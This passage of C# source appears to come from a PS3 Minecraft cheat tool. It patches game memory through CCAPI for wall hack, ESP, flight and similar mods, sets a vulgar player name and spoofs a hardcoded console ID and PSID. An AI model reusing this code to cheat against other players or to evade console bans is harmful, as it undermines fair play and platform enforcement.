                PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nMax XP Level Enabled");
            }
            else
            {
                PS3.SetMemory(0x004B0094, new byte[] { 0x7C, 0xA5, 0x20, 0x14 }); ////SET to default
                PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nMax XP Level Disabled");
            }
        }

        private void metroButton11_Click(object sender, EventArgs e)
        {
            PS3.SetMemory(0x3000ABE4, new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });

            byte[] bytes = Encoding.ASCII.GetBytes("\nI'm Using Demo V6\ndowncraft.xyz\n");

            PS3.SetMemory(0x3000ABE4, bytes);

            timer1.Start();
            metroLabel3.Text = PS3.Extension.ReadString(0x3000ABE4); //////NAME SLOT OF MINECRAFT
            PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\n V6 Name Added");
        }

        private void metroButton12_Click(object sender, EventArgs e)
        {
            PS3.SetMemory(0x3000ABE4, new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });

            byte[] bytes = Encoding.ASCII.GetBytes("\n@\n@\n@\n@\n@\n@\n@\n@\n@\n@\n");

            PS3.SetMemory(0x3000ABE4, bytes);

            timer1.Start();
            metroLabel3.Text = PS3.Extension.ReadString(0x3000ABE4); //////NAME SLOT OF MINECRAFT
            PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\n Weird Name Added");
        }

        private void metroCheckBox25_CheckedChanged(object sender, EventArgs e)
        {
            if (metroCheckBox25.Checked)  //////Better Time
            {
                PS3.SetMemory(0x00A9A6DC, new byte[] { 0x0F }); ////MODIFED VALUE
                PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nBetter Time Enabled");
            }
            else
            {
                PS3.SetMemory(0x00A9A6DC, new byte[] { 0x3F }); ////SET to default
                PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nBetter Time Disabled");
            }
        }

        private void metroCheckBox26_CheckedChanged(object sender, EventArgs e)
        {
            if (metroCheckBox26.Checked)  //////No FALL Damage
            {
                PS3.SetMemory(0x003A409C, new byte[] { 0x40 }); ////MODIFED VALUE
                PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nNo Fall Damage Enabled");
            }
            else
            {
                PS3.SetMemory(0x003A409C, new byte[] { 0x41 }); ////SET to default
                PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nNo Fall Damage Disabled");
            }
        }

        private void metroCheckBox27_CheckedChanged(object sender, EventArgs e)
        {
            if (metroCheckBox27.Checked)  ////Auto Regenerate
            {
                PS3.SetMemory(0x002ADCE8, new byte[] { 0x68, 0x63, 0x00, 0x00 }); ////MODIFED VALUE
                PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nAuto Regenerate Enabled");
            }
            else
            {
                PS3.SetMemory(0x002ADCE8, new byte[] { 0x68, 0x63, 0x00, 0x01 }); ////SET to default
                PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nAuto Regenerate Disabled");
            }
        }

        private void metroCheckBox28_CheckedChanged(object sender, EventArgs e)
        {
            if (metroCheckBox28.Checked)  //////Stop Fall Gravity
            {
                PS3.SetMemory(0x00246A2C, new byte[] { 0xFF }); ////MODIFED VALUE
                PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nStop Fall Gravity Enabled");
            }
            else
            {
                PS3.SetMemory(0x00246A2C, new byte[] { 0x3F }); ////SET to default
                PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nStop Fall Gravity Disabled");
            }
        }

        private void metroButton13_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void metroButton14_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        private void metroButton16_Click(object sender, EventArgs e)
        {
            PS3.CCAPI.SetConsoleID("000000010085000B1405AEA7BCDD18BB");
        }

        private void metroButton17_Click(object sender, EventArgs e)
        {
            PS3.CCAPI.SetPSID("00120730FA98883027DEA5FC6BAA891A");
        }

        private void metroButton18_Click(object sender, EventArgs e)
        {
            music.controls.play();
        }

        private void metroButton19_Click(object sender, EventArgs e)
        {
            music.controls.stop();
        }

        private void metroButton23_Click(object sender, EventArgs e)
        {
            Process.Start("https://downcraft.xyz/");
        }

        private void metroButton22_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Do you want buy Premium Version ?\n\n350 Mods + new stuffs, update all months, 10$ lifetime free update\n\nhttps://downcraft.xyz (Only PayPal)", "DownCraft Demo", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private void metroButton21_Click(object sender, EventArgs e)
        {
            timer1.Stop();
        }

        private void metroButton20_Click(object sender, EventArgs e)
        {
            PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nCPU:" + PS3.CCAPI.GetTemperatureCELL() + "RSX:" + PS3.CCAPI.GetTemperatureRSX() + "\nFirmware:" + PS3.CCAPI.GetFirmwareType() + PS3.CCAPI.GetFirmwareVersion() + "\nUsername:" + metroLabel3.Text + "\n\nThanks for using DownCraft RTM");
        }

        private void metroButton15_Click(object sender, EventArgs e)
        {
            PS3.DisconnectTarget();
        }

        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            Process.Start("https://downcraft.xyz/client/demo");
        }

        private void linkLabel2_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            Process.Start("https://downcraft.xyz");
        }

        private void linkLabel3_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            Process.Start("https://discord.gg/bxhpEhK");
        }

        private void linkLabel4_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            Process.Start("https://downcraft.xyz/client/support");
        }

        private void metroButton24_Click(object sender, EventArgs e)
        {
            PS3.SetMemory(0x3000ABE4, new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });

            byte[] bytes = Encoding.ASCII.GetBytes("");

            PS3.SetMemory(0x3000ABE4, bytes);

            timer1.Start();
            metroLabel3.Text = PS3.Extension.ReadString(0x3000ABE4); //////NAME SLOT OF MINECRAFT
            PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\n Draw Name Added");
        }

        private void metroCheckBox29_CheckedChanged(object sender, EventArgs e)
        {
            if (metroCheckBox29.Checked)  //////Jump Speed
            {
                PS3.SetMemory(0x003AA999, new byte[] { 0xA0 }); ////MODIFED VALUE
                PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nJump Speed Enabled");
            }
            else
            {
                PS3.SetMemory(0x003AA999, new byte[] { 0x68 }); ////MODIFED VALUE
                PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nJump Speed Disabled");
            }
        }

        private void metroCheckBox30_CheckedChanged(object sender, EventArgs e)
        {
            if (metroCheckBox30.Checked)  //////Auto Jump
            {
                PS3.SetMemory(0x00B01BAC, new byte[] { 0x41 }); ////MODIFED VALUE
                PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nAuto Jump Enabled");
            }
            else
            {
                PS3.SetMemory(0x00B01BAC, new byte[] { 0x40 }); ////MODIFED VALUE
                PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nAuto Jump Disabled");
            }
        }

        private void metroCheckBox32_CheckedChanged(object sender, EventArgs e)
        {
            if (metroCheckBox32.Checked)  //////Name Over Head
            {
                PS3.SetMemory(0x00AD8158, new byte[] { 0x4C }); ////MODIFED VALUE
                PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nName Over Head Enabled");
            }
            else
            {
                PS3.SetMemory(0x00AD8158, new byte[] { 0x2C }); ////MODIFED VALUE
                PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nName Over Head Disabled");
            }
        }

        private void metroCheckBox33_CheckedChanged(object sender, EventArgs e)
        {
            if (metroCheckBox33.Checked)  //////Apocalipse
            {
                PS3.SetMemory(0x00AD5EC8, new byte[] { 0xBF, 0xFF }); ////MODIFED VALUE
                PS3.SetMemory(0x00410734, new byte[] { 0xCD, 0xC0, 0x00, 0x00 }); ////MODIFED VALUE
                PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nApocalipse Enabled");
            }
            else
            {
                PS3.SetMemory(0x00AD5EC8, new byte[] { 0xBF, 0x80 }); ////SET to default
                PS3.SetMemory(0x00410734, new byte[] { 0x40, 0xC0, 0x00, 0x00 }); ////MODIFED VALUE
                PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nApocalipse Disabled");
            }
        }

        private void metroCheckBox34_CheckedChanged(object sender, EventArgs e)
        {
            if (metroCheckBox34.Checked)  //////Size HUD
            {
                PS3.SetMemory(0x0090FAC8, new byte[] { 0x41, 0x82 }); ////MODIFED VALUE
                PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nSize HUD Enabled");
            }
            else
            {
                PS3.SetMemory(0x0090FAC8, new byte[] { 0x40, 0x82 }); ////SET to default
                PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nSize HUD Disabled");
            }
        }

        private void metroComboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            uint offset = 0x00410734;
            uint offset1 = 0x00410738;

            if (this.metroComboBox1.SelectedIndex == 0)
            {
                byte[] buffer = new byte[] { 0x40, 0xC0 }; //RESET
                byte[] buffer1 = new byte[] { 0x3F, 0x80 }; //RESET
                PS3.SetMemory(offset, buffer);
                PS3.SetMemory(offset1, buffer1);
            }
            else if (this.metroComboBox1.SelectedIndex == 1)
            {
                byte[] buffer = new byte[] { 0x40, 0x50 }; //GREEN SKY COLORS
                PS3.SetMemory(offset, buffer);
            }
            else if (this.metroComboBox1.SelectedIndex == 2)
            {
                byte[] buffer = new byte[] { 0xBF, 0x80 }; //BLUE SKY COLORS
                PS3.SetMemory(offset1, buffer);
            }
            else if (this.metroComboBox1.SelectedIndex == 3)
            {
                byte[] buffer = new byte[] { 0x49, 0xC0 }; //Purple Sky Colors
                PS3.SetMemory(offset, buffer);
            }
            else if (this.metroComboBox1.SelectedIndex == 4)
            {
                byte[] buffer = new byte[] { 0x42, 0xC0 }; //Pink Sky Colors
                PS3.SetMemory(offset, buffer);
            }
            else if (this.metroComboBox1.SelectedIndex == 5)
            {
                byte[] buffer = new byte[] { 0x43, 0xC0 }; //Orange Sky Colors
                PS3.SetMemory(offset, buffer);
            }
            else if (this.metroComboBox1.SelectedIndex == 6)
            {
                byte[] buffer = new byte[] { 0xF0, 0xC0 }; //Black Sky Colors
                PS3.SetMemory(offset, buffer);
            }
            else if (this.metroComboBox1.SelectedIndex == 7)
            {
                byte[] buffer = new byte[] { 0x3F, 0xF0 }; //White Sky Colors
                PS3.SetMemory(offset1, buffer);
            }
        }

        private void metroComboBox2_SelectedIndexChanged(object sender, EventArgs e)
        {
            uint offset = 0x014C670C;
            if (this.metroComboBox2.SelectedIndex == 0)
            {
                byte[] buffer = new byte[] { 0x3F, 0x80, 0x00, 0x00, 0x3F, 0x80, 0x00, 0x00, 0x3F, 0x80, 0x00, 0x00, 0x3F, 0x80, 0x00, 0x00 };
                PS3.SetMemory(offset, buffer);
            }
            else if (this.metroComboBox2.SelectedIndex == 1)
            {
                byte[] buffer = new byte[] { 0x3F, 0x80, 0x00, 0x00, 0x4F, 0x80, 0x00, 0x00, 0x3F, 0x80, 0x00, 0x00, 0x3F, 0x80, 0x00, 0x00 };
                PS3.SetMemory(offset, buffer);
            }
            else if (this.metroComboBox2.SelectedIndex == 2)
            {
                byte[] buffer = new byte[] { 0x3F, 0x80, 0x00, 0x00, 0x1F, 0x80, 0x00, 0x00, 0x3F, 0x80, 0x00, 0x00, 0x3F, 0x80, 0x00, 0x00 };
                PS3.SetMemory(offset, buffer);
            }
            else if (this.metroComboBox2.SelectedIndex == 3)
            {
                byte[] buffer = new byte[] { 0x3F, 0xFF, 0x00, 0x00, 0x1F, 0x80, 0x00, 0x00, 0x3F, 0x80, 0x00, 0x00, 0x3F, 0x80, 0x00, 0x00 };
                PS3.SetMemory(offset, buffer);
            }
            else if (this.metroComboBox2.SelectedIndex == 4)
            {
                byte[] buffer = new byte[] { 0X5F, 0x80, 0x00, 0x00, 0x5F, 0x80, 0x00, 0x00, 0x3F, 0x80, 0x00, 0x00, 0x3F, 0x80, 0x00, 0x00 };
                PS3.SetMemory(offset, buffer);
            }
            else if (this.metroComboBox2.SelectedIndex == 5)
            {
                byte[] buffer = new byte[] { 0X8F, 0x80, 0x00, 0x00, 0x8F, 0x80, 0x00, 0x00, 0x3F, 0x80, 0x00, 0x00, 0x3F, 0x80, 0x00, 0x00 };
                PS3.SetMemory(offset, buffer);
            }
            else if (this.metroComboBox2.SelectedIndex == 6)
            {
                byte[] buffer = new byte[] { 0X00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
                PS3.SetMemory(offset, buffer);
            }
            else if (this.metroComboBox2.SelectedIndex == 7)
            {
                byte[] buffer = new byte[] { 0X3F, 0x00, 0x00, 0x00, 0x3F, 0x00, 0x00, 0x00, 0x3F, 0x00, 0x00, 0x00, 0x3F, 0x00, 0x00, 0x00 };
                PS3.SetMemory(offset, buffer);
            }
        }

        private void metroCheckBox35_CheckedChanged(object sender, EventArgs e)
        {
            if (metroCheckBox35.Checked)  //////Wall Hack V1
            {
                PS3.SetMemory(0x30012913, new byte[] { 0x05 }); ////MODIFED VALUE
                PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nWall Hack Enabled");
            }
            else
            {
                PS3.SetMemory(0x30012913, new byte[] { 0x07 }); ////SET to default
                PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nWall Hack Disabled");
            }
        }

        private void metroCheckBox36_CheckedChanged(object sender, EventArgs e)
        {
            if (metroCheckBox35.Checked)  /////ID Items
            {
                PS3.SetMemory(0x003097C8, new byte[] { 0x40 }); ////MODIFED VALUE
                PS3.SetMemory(0x003097B8, new byte[] { 0x40 }); ////MODIFED VALUE
                PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nID Items Enabled");
            }
            else
            {
                PS3.SetMemory(0x003097C8, new byte[] { 0x41 }); ////MODIFED VALUE
                PS3.SetMemory(0x003097B8, new byte[] { 0x41 }); ////MODIFED VALUE
                PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nID Items Disabled");
            }
        }

        private void metroCheckBox37_CheckedChanged(object sender, EventArgs e)
        {
            if (metroCheckBox37.Checked)  //////Best Sky
            {
                PS3.SetMemory(0x00410738, new byte[] { 0x3F, 0x10 }); ////MODIFED VALUE
                PS3.SetMemory(0x0038C658, new byte[] { 0x7F }); ////MODIFED VALUE
                PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nBest Sky Enabled");
            }
            else
            {
                PS3.SetMemory(0x00410738, new byte[] { 0x3F, 0x80 }); ////SET to default
                PS3.SetMemory(0x0038C658, new byte[] { 0x3F });  ////SET to default
                PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nBest Sky Disabled");
            }
        }

        private void metroCheckBox41_CheckedChanged(object sender, EventArgs e)
        {
            if (metroCheckBox41.Checked)  //////No Slow Down
            {
                PS3.SetMemory(0x003AFB60, new byte[] { 0x4F }); ////MODIFED VALUE
                PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nNo Slow Down Enabled");
            }
            else
            {
                PS3.SetMemory(0x003AFB60, new byte[] { 0x3F }); ////SET to default
                PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nNo Slow Down Enabled");
            }
        }

        private void metroCheckBox42_CheckedChanged(object sender, EventArgs e)
        {
            if (metroCheckBox42.Checked)  //////Foot Step Fast
            {
                PS3.SetMemory(0x002267F0, new byte[] { 0x3F, 0xFF }); ////MODIFED VALUE
                PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nFoot Step Fast Enabled");
            }
            else
            {
                PS3.SetMemory(0x002267F0, new byte[] { 0x3F, 0x19 }); ////SET to default
                PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nFoot Step Fast Disabled");
            }
        }

        private void metroCheckBox43_CheckedChanged(object sender, EventArgs e)
        {
            if (metroCheckBox43.Checked)  //////Foot Step Slow
            {
                PS3.SetMemory(0x002267F0, new byte[] { 0x2F, 0x00 }); ////MODIFED VALUE
                PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nFoot Step Slow Enabled");
            }
            else
            {
                PS3.SetMemory(0x002267F0, new byte[] { 0x3F, 0x19 }); ////SET to default
                PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nFoot Step Slow Disabled");
            }
        }

        private void metroCheckBox44_CheckedChanged(object sender, EventArgs e)
        {
            if (metroCheckBox44.Checked)  //////Hurt Cam
            {
                PS3.SetMemory(0x00A972B0, new byte[] { 0x00, 0x00 }); ////MODIFED VALUE
                PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nHurt Camera Enabled");
            }
            else
            {
                PS3.SetMemory(0x00A972B0, new byte[] { 0x40, 0x49 }); ////SET to default
                PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nHurt Camera Disabled");
            }
        }

        private void bunifuImageButton1_Click(object sender, EventArgs e)
        {
            nya.URL = @"Musics\Nya.mp3";
            nya.controls.play();
            try
            {
                if (MessageBox.Show("You want close DownCraft RTM ?", "DownCraft", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
                {
                    clos.Start();
                }
                else
                {

                }
            }
            catch
            {

            }
        }

        private void bunifuImageButton2_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        private void metroButton14_Click_1(object sender, EventArgs e)
        {
            ColorDialog theme = new ColorDialog();
            ColorDialog theme1 = new ColorDialog();

            if (MessageBox.Show("Do you want change Theme Primary Colors DownCraft ?", "DownCraft RTM", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
            {
                theme.ShowDialog();
            }
            else
            {

            }

            if (MessageBox.Show("Do you want change Theme Secondary DownCraft ?", "DownCraft RTM", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
            {
                theme1.ShowDialog();
            }
            else
            {

            }



            {
                setBgColor(theme.Color); //CHANGE ALL COLORS OF THEMES
                setBgColor1(theme1.Color); //CHANGE ALL COLORS OF THEMES
            }
        }

        public void setBgColor(Color rgb) //THEME 1
        {
            bunifuGradientPanel1.GradientTopLeft = rgb;
            bunifuGradientPanel1.GradientTopRight = rgb;

            bunifuGradientPanel2.GradientTopLeft = rgb;
            bunifuGradientPanel2.GradientTopRight = rgb;
        }

        public void setBgColor1(Color rgb) //THEME 2
        {
            bunifuGradientPanel1.GradientBottomLeft = rgb;
            bunifuGradientPanel1.GradientBottomLeft = rgb;

            bunifuGradientPanel2.GradientBottomLeft = rgb;
            bunifuGradientPanel2.GradientBottomLeft = rgb;
        }

        private void SetBackColorIncludingChildren(Control parent, Color backColor, Type controlType)
        {
            if (parent.GetType() == controlType)
            {
                parent.BackColor = backColor;
            }

            foreach (Control child in parent.Controls)
            {
                SetBackColorIncludingChildren(child, backColor, controlType);
            }
        }

        private void SetBackColorIncludingChildren1(Control parent, Color forecolor, Type controlType)
        {
            if (parent.GetType() == controlType)
            {
                parent.ForeColor = forecolor;
            }

            foreach (Control child in parent.Controls)
            {
                SetBackColorIncludingChildren1(child, forecolor, controlType);
            }
        }

        private void metroButton25_Click(object sender, EventArgs e)
        {
            ColorDialog theme5 = new ColorDialog();
            ColorDialog theme6 = new ColorDialog();

            if (MessageBox.Show("Do you want change Primary Theme DownCraft ?", "DownCraft RTM", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
            {
                theme5.ShowDialog();
            }
            else
            {

            }

            if (MessageBox.Show("Do you want change 2 Secondary DownCraft ?", "DownCraft RTM", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
            {
                theme6.ShowDialog();
            }
            else
            {

            }



            {
                setBgColor5(theme5.Color); //CHANGE ALL COLORS OF THEMES
                setBgColor6(theme6.Color); //CHANGE ALL COLORS OF THEMES
            }
        }

        public void setBgColor5(Color rgb) //THEME 1
        {
            bunifuGradientPanel2.GradientBottomLeft = rgb;
            bunifuGradientPanel2.GradientBottomLeft = rgb;

            bunifuGradientPanel2.GradientTopLeft = rgb;
            bunifuGradientPanel2.GradientTopRight = rgb;
        }

        public void setBgColor6(Color rgb) //THEME 2
        {
            bunifuGradientPanel1.GradientBottomLeft = rgb;
            bunifuGradientPanel1.GradientBottomLeft = rgb;

            bunifuGradientPanel1.GradientTopLeft = rgb;
            bunifuGradientPanel1.GradientTopRight = rgb;
        }

        private void SetBackColorIncludingChildren5(Control parent, Color backColor, Type controlType)
        {
            if (parent.GetType() == controlType)
            {
                parent.BackColor = backColor;
            }

            foreach (Control child in parent.Controls)
            {
                SetBackColorIncludingChildren5(child, backColor, controlType);
            }
        }

        private void SetBackColorIncludingChildren6(Control parent, Color forecolor, Type controlType)
        {
            if (parent.GetType() == controlType)
            {
                parent.ForeColor = forecolor;
            }

            foreach (Control child in parent.Controls)
            {
                SetBackColorIncludingChildren6(child, forecolor, controlType);
            }
        }

        private void metroCheckBox45_CheckedChanged(object sender, EventArgs e)
        {
            if (metroCheckBox45.Checked)  ////ESP Players / Mobs RED
            {
                PS3.SetMemory(0x00AD5B60, new byte[] { 0x41 }); ////MODIFED VALUE
                PS3.SetMemory(0x00AD5A5C, new byte[] { 0x6F, 0xFF }); ////MODIFED VALUE
            }
            else
            {
                PS3.SetMemory(0x00AD5B60, new byte[] { 0x40 }); ////SET to default
                PS3.SetMemory(0x00AD5A5C, new byte[] { 0x3F, 0x80 }); ////SET to default
            }
        }

        private void metroCheckBox46_CheckedChanged(object sender, EventArgs e)
        {
            if (metroCheckBox46.Checked)  //////Sky Nether
            {
                PS3.SetMemory(0x00B22050, new byte[] { 0x41 }); ////MODIFED VALUE
            }
            else
            {
                PS3.SetMemory(0x00B22050, new byte[] { 0x40 }); ////SET to default
            }
        }

        private void metroCheckBox47_CheckedChanged(object sender, EventArgs e)
        {
            if (metroCheckBox47.Checked)  //////Gravity Moon
            {
                PS3.SetMemory(0x003ABF88, new byte[] { 0x40 }); ////MODIFED VALUE
            }
            else
            {
                PS3.SetMemory(0x003ABF88, new byte[] { 0x41 }); ////SET to default
            }
        }

        private void metroCheckBox48_CheckedChanged(object sender, EventArgs e)
        {
            if (metroCheckBox48.Checked)  //////Extrem Explosion Creeper
            {
                PS3.SetMemory(0x001CC7E0, new byte[] { 0x40, 0xFF }); ////MODIFED VALUE
            }
            else
            {
                PS3.SetMemory(0x001CC7E0, new byte[] { 0x3F, 0x80 }); ////SET to default
            }
        }

        private void metroCheckBox49_CheckedChanged(object sender, EventArgs e)
        {
            if (metroCheckBox49.Checked)  //////Texture Plastic
            {
                PS3.SetMemory(0x30012913, new byte[] { 0x01 }); ////MODIFED VALUE
            }
            else
            {
                PS3.SetMemory(0x30012913, new byte[] { 0x07 }); ////SET to default
            }
        }

        private void metroCheckBox50_CheckedChanged(object sender, EventArgs e)
        {
            if (metroCheckBox50.Checked)  //////Infinite Food
            {
                PS3.SetMemory(0x0043E9F7, new byte[] { 0x00 }); ////MODIFED VALUE
            }
            else
            {
                PS3.SetMemory(0x0043E9F7, new byte[] { 0x01 }); ////SET to default
            }
        }

        private void metroCheckBox51_CheckedChanged(object sender, EventArgs e)
        {
            if (metroCheckBox51.Checked)  //////Disable Fog
            {
                PS3.SetMemory(0x003A3FF0, new byte[] { 0xFF, 0x00 }); //MODIFIED VALUES
            }
            else
            {
                PS3.SetMemory(0x003A3FF0, new byte[] { 0x3F, 0x80 }); //DEFAULT VALUES
            }
        }

        private void metroCheckBox52_CheckedChanged(object sender, EventArgs e)
        {
            if (metroCheckBox52.Checked)  ////Make Snow !
            {
                PS3.SetMemory(0x00A9B23E, new byte[] { 0x48 }); ////MODIFED VALUE
                PS3.SetMemory(0x00A9B986, new byte[] { 0x58 }); ////MODIFED VALUE
            }
            else
            {
                PS3.SetMemory(0x00A9B23E, new byte[] { 0x08 }); ////SET to default
                PS3.SetMemory(0x00A9B986, new byte[] { 0x08 }); ////SET to default
            }
        }

        private void metroCheckBox53_CheckedChanged(object sender, EventArgs e)
        {
            if (metroCheckBox53.Checked)  ////Remove Fire Animations
            {
                MessageBox.Show("Not Fixed !", "How to use ?", MessageBoxButtons.OK, MessageBoxIcon.Question);
            }
        }

        private void metroCheckBox19_CheckedChanged(object sender, EventArgs e)
        {
            if (metroCheckBox19.Checked)  //////Smoke Lobby
            {
                PS3.SetMemory(0x00B24177, new byte[] { 0x01 }); ////MODIFED VALUE
            }
            else
            {
                PS3.SetMemory(0x00B24177, new byte[] { 0x00 }); ////SET to default
            }
        }

        private void metroCheckBox21_CheckedChanged(object sender, EventArgs e)
        {
            if (metroCheckBox21.Checked)  ////Small Text
            {
                PS3.SetMemory(0x0079E326, new byte[] { 0x48 }); ////MODIFED VALUE
            }
            else
            {
                PS3.SetMemory(0x0079E326, new byte[] { 0x08 }); ////SET to default
            }
        }

        private void defaultname()
        {
            PS3.SetMemory(0x3000ABE4, new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });

            byte[] bytes = Encoding.ASCII.GetBytes("IM A HOE <3 FUCK ME");

            PS3.SetMemory(0x3000ABE4, bytes);

            timer1.Start();
            metroLabel3.Text = PS3.Extension.ReadString(0x3000ABE4); //////NAME SLOT OF MINECRAFT
        }

        private void metroCheckBox31_CheckedChanged(object sender, EventArgs e)
        {
            if (metroCheckBox31.Checked)  //////Old Fly Option
            {
                MessageBox.Show("Old Fly Option\n\nIt's a old options found in 2017/2018 if you join a lobbys or make a wold you have fly instant enabled, if you change your gamemode too !", "How to use ?", MessageBoxButtons.OK, MessageBoxIcon.Question);
                PS3.SetMemory(0x00A98F50, new byte[] { 0x3F, 0x00 }); ////MODIFED VALUE
                PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nOld Fly Options Enabled");
            }
            else
            {
                PS3.SetMemory(0x00A98F50, new byte[] { 0x3D, 0x8C }); ////MODIFED VALUE
                PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nOld Fly Options Disabled");
            }
        }

        private void metroCheckBox38_CheckedChanged(object sender, EventArgs e)
        {
            if (metroCheckBox38.Checked)  //////FOV Without Hand
            {
                PS3.SetMemory(0x00987502, new byte[] { 0x68 }); ////MODIFED VALUE
                PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nFOV Without Hand Enabled");
            }
            else
            {
                PS3.SetMemory(0x00987502, new byte[] { 0x08 }); ////SET to default
                PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nFOV Without Hand Disabled");
            }
        }

        private void clos_Tick(object sender, EventArgs e)
        {
            if (this.Opacity > 0.0)
            {
                this.Opacity -= 0.025;
            }
            else
            {
                clos.Stop();
                Application.Exit();
            }
        }

        private void metroButton26_Click(object sender, EventArgs e)
        {
            Stream myStream = null;
            OpenFileDialog openFileDialog1 = new OpenFileDialog();

            openFileDialog1.InitialDirectory = System.IO.Path.Combine(System.IO.Path.GetDirectoryName(Application.ExecutablePath), @"Backgrounds");
            openFileDialog1.Filter = "Images File (*.png)|*.png";
            openFileDialog1.FileName = "Background DownCraft";
            openFileDialog1.FilterIndex = 2;
            openFileDialog1.RestoreDirectory = true;

            if (openFileDialog1.ShowDialog() == DialogResult.OK)
            {
                try
                {
                    if ((myStream = openFileDialog1.OpenFile()) != null)
                    {
                        using (myStream)
                        {
                            pictureBox1.Image = Image.FromFile(openFileDialog1.FileName);
                            pictureBox6.Image = Image.FromFile(openFileDialog1.FileName);
                            pictureBox7.Image = Image.FromFile(openFileDialog1.FileName);
                        }
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show("Error, can't found or add background images !");
                }
            }
        }

        private void metroButton27_Click(object sender, EventArgs e)
        {
            Stream myStream = null;
            OpenFileDialog openFileDialog1 = new OpenFileDialog();

